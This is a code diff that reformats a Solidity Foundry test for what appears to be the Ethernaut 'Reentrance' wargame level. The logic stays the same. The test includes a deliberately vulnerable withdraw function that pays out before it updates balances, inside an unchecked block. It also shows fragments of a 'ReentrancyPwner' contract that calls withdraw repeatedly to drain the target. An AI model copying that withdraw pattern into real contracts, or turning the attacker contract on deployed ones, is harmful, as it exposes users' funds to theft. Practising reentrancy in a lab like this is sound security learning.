@@ -3,26 +3,28 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 
-import 'openzeppelin/contracts/utils/math/SafeMath.sol';
+import "openzeppelin/contracts/utils/math/SafeMath.sol";
 
 contract Reentrance {
     //
     using SafeMath for uint256;
-    mapping(address => uint) public balances;
+
+    mapping(address => uint256) public balances;
 
     function donate(address _to) public payable {
         balances[_to] = balances[_to].add(msg.value);
     }
 
-    function balanceOf(address _who) public view returns (uint balance) {
+    function balanceOf(address _who) public view returns (uint256 balance) {
         return balances[_who];
     }
 
-    function withdraw(uint _amount) public {
-        unchecked { // bc after Solidity 0.8.0
-            if(balances[msg.sender] >= _amount) {
-                (bool result,) = msg.sender.call{value:_amount}("");
-                if(result) {
+    function withdraw(uint256 _amount) public {
+        unchecked {
+            // bc after Solidity 0.8.0
+            if (balances[msg.sender] >= _amount) {
+                (bool result,) = msg.sender.call{value: _amount}("");
+                if (result) {
                     _amount;
                 }
                 balances[msg.sender] -= _amount;
@@ -35,7 +37,7 @@ contract Reentrance {
 
 interface IReentrancy {
     function donate(address _to) external payable;
-    function withdraw(uint _amount) external;
+    function withdraw(uint256 _amount) external;
 }
 
 contract ReentrancyPwner {
@@ -68,11 +70,10 @@ contract ReentrancyPwner {
         bool moreToSteal = targetTotalRemainingBalance > 0;
 
         if (moreToSteal) {
-            uint256 toWithdraw = initialDeposit < targetTotalRemainingBalance
-                ? initialDeposit
-                : targetTotalRemainingBalance;
+            uint256 toWithdraw =
+                initialDeposit < targetTotalRemainingBalance ? initialDeposit : targetTotalRemainingBalance;
             target.withdraw(toWithdraw);
-        }  
+        }
     }
 }
 
